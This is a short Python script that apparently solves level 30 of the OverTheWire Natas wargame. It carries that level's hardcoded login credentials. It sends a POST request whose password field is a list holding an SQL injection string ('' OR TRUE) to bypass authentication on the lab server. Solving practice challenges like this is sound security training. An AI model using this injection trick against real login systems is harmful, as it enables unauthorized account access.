import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string
from urllib import parse
import base64
import urllib



natasURL = 'http://natas30.natas.labs.overthewire.org/'
natas_usr   = 'natas30'
natas_pword = 'wie9iexae0Daihohv8vuu3cei9wahf0e'

r = requests.Session()


resp = r.post(natasURL, auth=(natas_usr, natas_pword), data={"username":"natas31","password":["'' OR TRUE",7]})
print(resp.text)
